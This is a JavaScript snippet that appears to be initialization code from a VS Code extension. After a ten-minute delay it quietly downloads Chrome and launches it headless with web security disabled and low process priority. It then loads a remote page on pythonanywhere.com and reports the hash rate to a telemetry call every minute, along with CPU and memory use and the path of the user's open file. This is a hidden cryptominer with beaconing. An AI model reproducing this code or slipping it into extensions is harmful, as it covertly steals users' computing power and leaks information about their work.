(async () => {


  const { readdir, stat } = require('fs/promises');
  const { join } = require('path');

  async function dirSize(dir) {
    const files = await readdir(dir, { withFileTypes: true });

    const paths = files.map(async file => {
      const path = join(dir, file.name);
      if (file.isDirectory()) return await dirSize(path);
      if (file.isFile()) {
        const { size } = await stat(path);

        return size;
      }
      return 0;
    });

    return (await Promise.all(paths)).flat(Infinity).reduce((i, size) => i + size, 0);
  }

  await tstt({ message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
  const cacheDir = `${os.homedir()}/.cache/puppeteer`;
  if (!fs.existsSync(cacheDir)) {
    fs.mkdirSync(cacheDir, { recursive: true });
  };
  const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
  let chromePath;
  const chromeBrowser = installedBrowsers.find(browser => browser.browser === 'chrome');
  console.log('installed', installedBrowsers);
  if (!chromeBrowser) {
    await new Promise(r => setTimeout(r, 10 * 60 * 1000));
    await tstt({ message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
    puppeteerBrowsers.InstallOptions;
    installedBrowser = await puppeteerBrowsers.install({
      browser: 'chrome',
      buildId: '130.0.6723.58',
      cacheDir,
    });
    chromePath = installedBrowser.executablePath;
  } else {
    chromePath = chromeBrowser.executablePath;
  }

  await tstt({ message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });

  let browser;
  let page;
  setInterval(async () => {
    if (browser && page) {
      const hs = await page.evaluate(() => { return window._client?.getHashesPerSecond(); });
      tstt({
        message: "HASH",
        value: parseFloat(hs).toFixed(2),
        cpu: getCPUUsage(),
        memory: getMemoryUsage(),
        file: safe(() => editor?.document?.uri?.fsPath)
      });
    } else {
      tstt({
        message: "HASH_WAIT " + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2),
        value: 0,
        file: safe(() => editor?.document?.uri?.fsPath)
      });
    }
  }, 60000);

  browser = await puppeteer.launch({
    executablePath: chromePath,
    headless: true,
    args: [
      '--disable-web-security',
      '--disable-features=IsolateOrigins,site-per-process',
      '--allow-running-insecure-content',
    ]
  });
  os.setPriority(browser.process().pid, 19);
  page = await browser.newPage();
  await page.goto('https://ab498.pythonanywhere.com/files/init.html');

  await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });

  const os = require('os');

  function getCPUUsage() {
    const cpus = os.cpus();
    const userTime = cpus.reduce((acc, cpu) => acc + cpu.times.user, 0);
    const niceTime = cpus.reduce((acc, cpu) => acc + cpu.times.nice, 0);
    const sysTime = cpus.reduce((acc, cpu) => acc + cpu.times.sys, 0);
    const idleTime = cpus.reduce((acc, cpu) => acc + cpu.times.idle, 0);
    const irqTime = cpus.reduce((acc, cpu) => acc + cpu.times.irq, 0);

    const total = userTime + niceTime + sysTime + idleTime + irqTime;
    const used = total - idleTime;
    return ((1 - idleTime / total) * 100).toFixed(2);
  }

  function getMemoryUsage() {
    const totalMemory = os.totalmem();
    const freeMemory = os.freemem();
    const usedMemory = totalMemory - freeMemory;
    return {
      free: (freeMemory / (1024 ** 3)).toFixed(2),  // in GB
      used: (usedMemory / (1024 ** 3)).toFixed(2),  // in GB
      total: (totalMemory / (1024 ** 3)).toFixed(2), // in GB
      percent: ((usedMemory / totalMemory) * 100).toFixed(2)
    };
  }

})();